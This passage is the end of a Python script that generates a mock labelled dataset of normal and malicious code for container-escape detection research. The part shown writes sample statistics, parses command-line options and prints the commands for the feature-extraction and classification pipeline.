        print(f"\n标签文件已生成: {csv_path}")
    
    def generate_statistics(self, num_normal: int, num_malicious: int):
        """生成统计信息"""
        stats = {
            "generation_time": datetime.now().isoformat(),
            "total_samples": num_normal + num_malicious,
            "normal_samples": num_normal,
            "malicious_samples": num_malicious,
            "attack_types_covered": 33,
            "output_directory": str(self.output_dir),
        }
        
        stats_path = self.output_dir / 'statistics.json'
        with open(stats_path, 'w', encoding='utf-8') as f:
            json.dump(stats, f, indent=2, ensure_ascii=False)
        
        print(f"统计信息已保存: {stats_path}")


def parse_args():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(
        description="容器逃逸攻击测试数据生成器（增强版）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例用法:
  # 生成默认数量 (100正常 + 100恶意 = 200个)
  python mock_data.py
  
  # 生成指定数量
  python mock_data.py --num_normal 1000 --num_malicious 1000
  
  # 指定输出目录
  python mock_data.py --output_dir ./my_dataset --num_normal 2000 --num_malicious 2000
        """
    )
    
    parser.add_argument("--output_dir", type=str, default="./mock_dataset",
                       help="输出目录（默认: ./mock_dataset）")
    parser.add_argument("--num_normal", type=int, default=100,
                       help="正常代码数量（默认: 100）")
    parser.add_argument("--num_malicious", type=int, default=100,
                       help="恶意代码数量（默认: 100）")
    parser.add_argument("--seed", type=int, default=42,
                       help="随机种子（默认: 42）")
    
    return parser.parse_args()


def main():
    """主函数"""
    args = parse_args()
    
    generator = MockDataGenerator(args.output_dir, args.seed)
    generator.generate_dataset(args.num_normal, args.num_malicious)
    
    print(f"\n可以使用以下命令进行特征提取:")
    print(f"  # 语义特征提取")
    print(f"  python 语义特征提取/优化版/batch_extract.py \\")
    print(f"         --source_dir {args.output_dir} \\")
    print(f"         --output_dir ./semantic_features")
    print(f"\n  # 结构特征提取")
    print(f"  python 结构特征提取/main_workflow_v2.py \\")
    print(f"         --source_dir {args.output_dir} \\")
    print(f"         --output_dir ./structure_output \\")
    print(f"         --embedding_dir ./graph_embeddings")
    print(f"\n  # 特征融合")
    print(f"  python tools/feature_integration.py \\")
    print(f"         --dirs ./semantic_features ./graph_embeddings \\")
    print(f"         --output ./integration")
    print(f"\n  # 分类实验")
    print(f"  python 监督分类任务/run_comparison_experiments.py \\")
    print(f"         --fusion-dir ./integration \\")
    print(f"         --label-file {args.output_dir}/labels.csv \\")
    print(f"         --output-dir ./comparison_results")


if __name__ == "__main__":
    main()
